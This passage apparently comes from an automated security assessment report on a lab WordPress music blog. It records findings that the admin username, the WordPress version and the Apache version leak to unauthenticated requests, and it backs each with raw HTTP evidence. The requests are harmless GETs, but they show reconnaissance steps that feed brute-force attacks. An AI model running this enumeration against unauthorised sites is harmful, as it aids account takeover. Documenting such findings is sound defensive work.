The WordPress REST API user endpoints (`/wp-json/wp/v2/users` and `/wp-json/wp/v2/users/1`) return author account details — including the real login username (`slug`/`name` = "wordpress_admin"), display name, and author archive link — to fully unauthenticated requests. This leaks the administrator's valid username to anyone, materially aiding credential-stuffing and brute-force attacks against wp-login. The same API correctly enforces auth for `/users/me` (returns 401 rest_not_logged_in), confirming the collection/by-id leak is a deliberate exposure of public-author data rather than a generic catch-all.

**Reproduction**

```
1. GET http://target.local:32812/index.php/wp-json/wp/v2/users/ with no cookie/authorization header → 200, JSON array leaking {"id":1,"name":"wordpress_admin","slug":"wordpress_admin"}. 2. GET .../wp-json/wp/v2/users/1 (no auth) → 200, same admin object. 3. Negative control: GET .../wp-json/wp/v2/users/me (no auth) → 401, no username disclosed. Effect marker "wordpress_admin" present in unauth list/by-id responses, absent in the auth-required control.
```

**Evidence**

- Evidence `ev-mr0t2byo-o` — `artifacts/s-0003/ev-mr0t2byo-o/`

Request:

```http
GET /index.php/wp-json/wp/v2/users/me HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 401
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 96
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:32:30 GMT
keep-alive: timeout=5, max=64
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"code":"rest_not_logged_in","message":"You are not currently logged in.","data":{"status":401}}
```

- Evidence `ev-mr0t2bo9-n` — `artifacts/s-0003/ev-mr0t2bo9-n/`

Request:

```http
GET /index.php/wp-json/wp/v2/users/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 423
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:32:30 GMT
keep-alive: timeout=5, max=67
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex
x-wp-total: 1
x-wp-totalpages: 1

[{"id":1,"name":"wordpress_admin","url":"http:\/\/melodicmayhem.local","description":"","link":"http:\/\/target.local:32812\/index.php\/author\/wordpress_admin\/","slug":"wordpress_admin","meta":[],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users"}]}}]
```

- Evidence `ev-mr0t3hcs-p` — `artifacts/s-0003/ev-mr0t3hcs-p/`

Request:

```http
GET /index.php/wp-json/wp/v2/users/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 423
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:33:24 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex
x-wp-total: 1
x-wp-totalpages: 1

[{"id":1,"name":"wordpress_admin","url":"http:\/\/melodicmayhem.local","description":"","link":"http:\/\/target.local:32812\/index.php\/author\/wordpress_admin\/","slug":"wordpress_admin","meta":[],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users"}]}}]
```

- Evidence `ev-mr0t3it1-q` — `artifacts/s-0003/ev-mr0t3it1-q/`

Request:

```http
GET /index.php/wp-json/wp/v2/users/1 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 421
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:33:26 GMT
keep-alive: timeout=5, max=99
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"id":1,"name":"wordpress_admin","url":"http:\/\/melodicmayhem.local","description":"","link":"http:\/\/target.local:32812\/index.php\/author\/wordpress_admin\/","slug":"wordpress_admin","meta":[],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users"}]}}
```

<a id="finding-6"></a>

### 6. [LOW] [info-disclosure] WordPress Version and Admin Username Disclosed via RSS Feed

- Screen: `s-0008`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

The WordPress RSS feed at `/?feed=rss2` is accessible without authentication and discloses two pieces of sensitive information: (1) the WordPress version ("?v=7.0") in the `<generator>` tag, and (2) the administrator username (`wordpress_admin`) in `<dc:creator>` tags on every post. Version disclosure enables targeted CVE exploitation; username disclosure directly supports credential-stuffing or brute-force attacks against `/wp-login.php`.

**Reproduction**

```
1. Send unauthenticated GET to http://target.local:32812/?feed=rss2. 2. Observe `<generator>https://wordpress.org/?v=7.0</generator>` in the channel header. 3. Observe `<dc:creator><![CDATA[wordpress_admin]]></dc:creator>` on each item.
```

**Evidence**

- Evidence `ev-mr0tidfz-20` — `artifacts/s-0008/ev-mr0tidfz-20/`

Request:

```http
GET /wp-json/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 15:44:59 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

- Evidence `ev-mr0tongx-2g` — `artifacts/s-0008/ev-mr0tongx-2g/`

Request:

```http
GET /?feed=rss2 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 8843
content-type: application/rss+xml; charset=UTF-8
date: Tue, 30 Jun 2026 15:49:52 GMT
etag: "6151915d6f15ce5a3b07e79dafe5a6f2-gzip"
keep-alive: timeout=5, max=100
last-modified: Tue, 18 Jun 2024 15:19:52 GMT
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>MELODIC MAYHEM</title>
	<atom:link href="http://target.local:32812/?feed=rss2" rel="self" type="application/rss+xml" />
	<link>http://target.local:32812</link>
	<description>Where chaos meets music</description>
	<lastBuildDate>Tue, 18 Jun 2024 15:19:52 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=7.0</generator>
	<item>
		<title>Global Music Markets: Exploring the K-pop Phenomenon</title>
		<link>http://target.local:32812/index.php/2024/06/17/global-music-markets-exploring-the-k-pop-phenomenon/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 22:55:59 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=53</guid>

					<description><![CDATA[K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes. The Rise of K-pop: Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes.</p>



<p class="wp-block-paragraph"><strong>The Rise of K-pop:</strong> Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not only topped international music charts but have also played sold-out concerts across continents.</p>



<p class="wp-block-paragraph"><strong>Cultural Impact:</strong> K-pop&#8217;s impact extends beyond music, influencing fashion, language, and social media trends around the world. Its unique blend of addictive melodies, dynamic choreography, and polished aesthetics has garnered a dedicated global fanbase.</p>



<p class="wp-block-paragraph"><strong>The Business of K-pop:</strong> The industry&#8217;s success is underpinned by a rigorous training system, where aspiring stars undergo years of intensive training in singing, dancing, and acting before debuting. This system has been critical in maintaining the high quality and consistency that fans have come to expect from K-pop acts.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> K-pop&#8217;s rise to global prominence is not just a passing trend but a significant shift in the cultural landscape. Its ability to resonate with diverse audiences across the globe underscores the universal appeal of music and its power to connect people across cultural boundaries.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Breaking Records: Vinyl Sales Surge to Highest Levels Since 1989</title>
		<link>http://target.local:32812/index.php/2024/06/17/breaking-records-vinyl-sales-surge-to-highest-levels-since-1989/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 22:55:24 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=50</guid>

					<description><![CDATA[In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music. The Stats: Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music.</p>



<p class="wp-block-paragraph"><strong>The Stats:</strong> Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million units were sold worldwide, marking a significant milestone in the vinyl revival.</p>



<p class="wp-block-paragraph"><strong>Why Vinyl?</strong> The resurgence of vinyl is fueled by a combination of nostalgia and a new appreciation among younger audiences who crave a more authentic music experience. Vinyl offers a unique sound quality that many enthusiasts claim is superior to digital formats, providing a richer and more immersive listening experience.</p>



<p class="wp-block-paragraph"><strong>Impact on the Music Industry:</strong> This vinyl renaissance is revitalizing record stores and independent labels, giving a financial boost to an industry that has struggled with the decline of physical sales. Artists are increasingly releasing special edition vinyl records, often including exclusive artwork and additional content to attract collectors.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> The enduring appeal of vinyl records is a testament to the timeless nature of music. As vinyl continues to thrive, it reaffirms the importance of physical media in a predominantly digital landscape, offering a unique blend of the past and present.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>The Rise of Virtual Concerts: A New Era in Live Music</title>
		<link>http://target.local:32812/index.php/2024/06/17/hello-world/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 21:55:15 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=1</guid>

					<description><![CDATA[As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways. The Technology Behind Virtual Concerts:The magic of virtual concerts lies in the blend [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways.</p>



<p class="wp-block-paragraph"><strong>The Technology Behind Virtual Concerts:</strong>The magic of virtual concerts lies in the blend of traditional live performances with cutting-edge technology. Platforms like Twitch, YouTube Live, and custom VR stages allow artists to perform live from anywhere. These platforms are equipped with features that enable real-time interaction between artists and fans, creating an engaging experience that rivals in-person events.</p>



<figure class="wp-block-image size-large is-resized"><img decoding="async" src="http://melodicmayhem.local/wp-content/themes/rock-tune/assets/images/explore-1.jpg" alt="" style="width:601px;height:auto"/></figure>



<p class="wp-block-paragraph"><strong>Notable Virtual Concerts:</strong> One of the landmark virtual events was the &#8220;Harmony &amp; Light&#8221; festival, which featured performances by global superstars like Elara Moon and DJ Vortex. The event drew in over 2 million viewers worldwide, showcasing the massive potential and reach of virtual live music.</p>



<p class="wp-block-paragraph"><strong>Benefits and Challenges:</strong> Virtual concerts offer unparalleled accessibility, allowing fans from all corners of the globe to participate without the need for travel. However, they also present challenges such as ensuring stable internet connections and managing digital rights, which are crucial for preserving the quality and integrity of the performances.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> Virtual concerts are likely to remain a staple in the music industry, even as live events gradually resume. Their ability to bridge geographical divides and connect artists with a global audience is invaluable in our increasingly digital world.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
```

- Evidence `ev-mr0tppt7-2h` — `artifacts/s-0008/ev-mr0tppt7-2h/`

Request:

```http
GET /?feed=rss2 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 8843
content-type: application/rss+xml; charset=UTF-8
date: Tue, 30 Jun 2026 15:50:41 GMT
etag: "6151915d6f15ce5a3b07e79dafe5a6f2-gzip"
keep-alive: timeout=5, max=100
last-modified: Tue, 18 Jun 2024 15:19:52 GMT
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>MELODIC MAYHEM</title>
	<atom:link href="http://target.local:32812/?feed=rss2" rel="self" type="application/rss+xml" />
	<link>http://target.local:32812</link>
	<description>Where chaos meets music</description>
	<lastBuildDate>Tue, 18 Jun 2024 15:19:52 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=7.0</generator>
	<item>
		<title>Global Music Markets: Exploring the K-pop Phenomenon</title>
		<link>http://target.local:32812/index.php/2024/06/17/global-music-markets-exploring-the-k-pop-phenomenon/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 22:55:59 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=53</guid>

					<description><![CDATA[K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes. The Rise of K-pop: Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes.</p>



<p class="wp-block-paragraph"><strong>The Rise of K-pop:</strong> Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not only topped international music charts but have also played sold-out concerts across continents.</p>



<p class="wp-block-paragraph"><strong>Cultural Impact:</strong> K-pop&#8217;s impact extends beyond music, influencing fashion, language, and social media trends around the world. Its unique blend of addictive melodies, dynamic choreography, and polished aesthetics has garnered a dedicated global fanbase.</p>



<p class="wp-block-paragraph"><strong>The Business of K-pop:</strong> The industry&#8217;s success is underpinned by a rigorous training system, where aspiring stars undergo years of intensive training in singing, dancing, and acting before debuting. This system has been critical in maintaining the high quality and consistency that fans have come to expect from K-pop acts.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> K-pop&#8217;s rise to global prominence is not just a passing trend but a significant shift in the cultural landscape. Its ability to resonate with diverse audiences across the globe underscores the universal appeal of music and its power to connect people across cultural boundaries.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Breaking Records: Vinyl Sales Surge to Highest Levels Since 1989</title>
		<link>http://target.local:32812/index.php/2024/06/17/breaking-records-vinyl-sales-surge-to-highest-levels-since-1989/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 22:55:24 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=50</guid>

					<description><![CDATA[In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music. The Stats: Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music.</p>



<p class="wp-block-paragraph"><strong>The Stats:</strong> Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million units were sold worldwide, marking a significant milestone in the vinyl revival.</p>



<p class="wp-block-paragraph"><strong>Why Vinyl?</strong> The resurgence of vinyl is fueled by a combination of nostalgia and a new appreciation among younger audiences who crave a more authentic music experience. Vinyl offers a unique sound quality that many enthusiasts claim is superior to digital formats, providing a richer and more immersive listening experience.</p>



<p class="wp-block-paragraph"><strong>Impact on the Music Industry:</strong> This vinyl renaissance is revitalizing record stores and independent labels, giving a financial boost to an industry that has struggled with the decline of physical sales. Artists are increasingly releasing special edition vinyl records, often including exclusive artwork and additional content to attract collectors.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> The enduring appeal of vinyl records is a testament to the timeless nature of music. As vinyl continues to thrive, it reaffirms the importance of physical media in a predominantly digital landscape, offering a unique blend of the past and present.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>The Rise of Virtual Concerts: A New Era in Live Music</title>
		<link>http://target.local:32812/index.php/2024/06/17/hello-world/</link>
		
		<dc:creator><![CDATA[wordpress_admin]]></dc:creator>
		<pubDate>Mon, 17 Jun 2024 21:55:15 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://melodicmayhem.local/?p=1</guid>

					<description><![CDATA[As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways. The Technology Behind Virtual Concerts:The magic of virtual concerts lies in the blend [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p class="wp-block-paragraph">As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways.</p>



<p class="wp-block-paragraph"><strong>The Technology Behind Virtual Concerts:</strong>The magic of virtual concerts lies in the blend of traditional live performances with cutting-edge technology. Platforms like Twitch, YouTube Live, and custom VR stages allow artists to perform live from anywhere. These platforms are equipped with features that enable real-time interaction between artists and fans, creating an engaging experience that rivals in-person events.</p>



<figure class="wp-block-image size-large is-resized"><img decoding="async" src="http://melodicmayhem.local/wp-content/themes/rock-tune/assets/images/explore-1.jpg" alt="" style="width:601px;height:auto"/></figure>



<p class="wp-block-paragraph"><strong>Notable Virtual Concerts:</strong> One of the landmark virtual events was the &#8220;Harmony &amp; Light&#8221; festival, which featured performances by global superstars like Elara Moon and DJ Vortex. The event drew in over 2 million viewers worldwide, showcasing the massive potential and reach of virtual live music.</p>



<p class="wp-block-paragraph"><strong>Benefits and Challenges:</strong> Virtual concerts offer unparalleled accessibility, allowing fans from all corners of the globe to participate without the need for travel. However, they also present challenges such as ensuring stable internet connections and managing digital rights, which are crucial for preserving the quality and integrity of the performances.</p>



<p class="wp-block-paragraph"><strong>Conclusion:</strong> Virtual concerts are likely to remain a staple in the music industry, even as live events gradually resume. Their ability to bridge geographical divides and connect artists with a global audience is invaluable in our increasingly digital world.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
```

<a id="finding-7"></a>

### 7. [LOW] [info-disclosure] Apache server version disclosed in 404 error pages

- Screen: `s-0015`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

Any request to a non-existent path triggers Apache's default 404 error page, which embeds the full server banner `Apache/2.4.41 (Ubuntu)` in the HTML `<address>` element. This allows unauthenticated fingerprinting of the web server version. Apache 2.4.41 (released 2019) has numerous post-release CVEs including high-severity mod_proxy SSRF (CVE-2021-40438, CVSS 9.0). The `/rock-tune/contact/` path itself does not exist — the contact form is likely served via WordPress at a different URL.

**Reproduction**

```
1. GET http://target.local:32812/rock-tune/contact/ (unauthenticated)
2. Observe 404 response body contains: `<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>`
3. Repeat with any non-existent path — behaviour is consistent.
4. Negative control: GET / returns 200 with WordPress HTML; no Apache version in body.
```

**Evidence**

- Evidence `ev-mr0u3pmz-3h` — `artifacts/s-0015/ev-mr0u3pmz-3h/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 182192
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:01:34 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='noindex, nofollow' />
<title>MELODIC MAYHEM &#8211; Where chaos meets music</title>
<link rel="alternate" type="application/rss+xml" title="MELODIC MAYHEM &raquo; Feed" href="http://target.local:32812/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="MELODIC MAYHEM &raquo; Comments Feed" href="http://target.local:32812/index.php/comments/feed/" />
<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<style id="wp-block-navigation-link-inline-css">
.wp-block-navigation .wp-block-navigation-item__label{overflow-wrap:break-word}.wp-block-navigation .wp-block-navigation-item__description{display:none}.link-ui-tools{outline:1px solid #f0f0f0;padding:8px}.link-ui-block-inserter{padding-top:8px}.link-ui-block-inserter__back{margin-left:8px;text-transform:uppercase}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/navigation-link/style.min.css */
</style>
<link rel='stylesheet' id='wp-block-navigation-css' href='http://target.local:32812/wp-includes/blocks/navigation/style.min.css?ver=7.0' media='all' />
<style id="wp-block-group-inline-css">
.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/group/style.min.css */
</style>
<style id="wp-block-group-theme-inline-css">
:where(.wp-block-group.has-background){padding:1.25em 2.375em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/group/theme.min.css */
</style>
<style id="wp-block-site-title-inline-css">
.wp-block-site-title{box-sizing:border-box}.wp-block-site-title :where(a){color:inherit;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/site-title/style.min.css */
</style>
<style id="wp-block-site-tagline-inline-css">
.wp-block-site-tagline{box-sizing:border-box}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/site-tagline/style.min.css */
</style>
<style id="wp-block-search-inline-css">
.wp-block-search__button{margin-left:10px;word-break:normal}.wp-block-search__button.has-icon{line-height:0}.wp-block-search__button svg{fill:currentColor;height:1.25em;min-height:24px;min-width:24px;vertical-align:text-bottom;width:1.25em}:where(.wp-block-search__button){border:1px solid #ccc;padding:6px 10px}.wp-block-search__inside-wrapper{display:flex;flex:auto;flex-wrap:nowrap;max-width:100%}.wp-block-search__label{width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__button{box-sizing:border-box;display:flex;flex-shrink:0;justify-content:center;margin-left:0;max-width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{min-width:0!important;transition-property:width}.wp-block-search.wp-block-search__button-only .wp-block-search__input{flex-basis:100%;transition-duration:.3s}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden,.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__inside-wrapper{overflow:hidden}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__input{border-left-width:0!important;border-right-width:0!important;flex-basis:0;flex-grow:0;margin:0;min-width:0!important;padding-left:0!important;padding-right:0!important;width:0!important}:where(.wp-block-search__input){appearance:none;border:1px solid #949494;flex-grow:1;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;margin-left:0;margin-right:0;min-width:3rem;padding:8px;text-decoration:unset!important;text-transform:inherit}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper){background-color:#fff;border:1px solid #949494;box-sizing:border-box;padding:4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input{border:none;border-radius:0;padding:0 4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input:focus{outline:none}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) :where(.wp-block-search__button){padding:4px 8px}.wp-block-search.aligncenter .wp-block-search__inside-wrapper{margin:auto}.wp-block[data-align=right] .wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{float:right}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/search/style.min.css */
</style>
<style id="wp-block-search-theme-inline-css">
.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/search/theme.min.css */
</style>
<link rel='stylesheet' id='rock-tune-header-search-style-css' href='http://target.local:32812/wp-content/themes/rock-tune/inc/blocks/dist/style-header-search.css?ver=1718671541' media='all' />
<style id="wp-block-template-part-theme-inline-css">
:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/template-part/theme.min.css */
</style>
<style id="wp-block-heading-inline-css">
h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/heading/style.min.css */
</style>
<style id="wp-block-paragraph-inline-css">
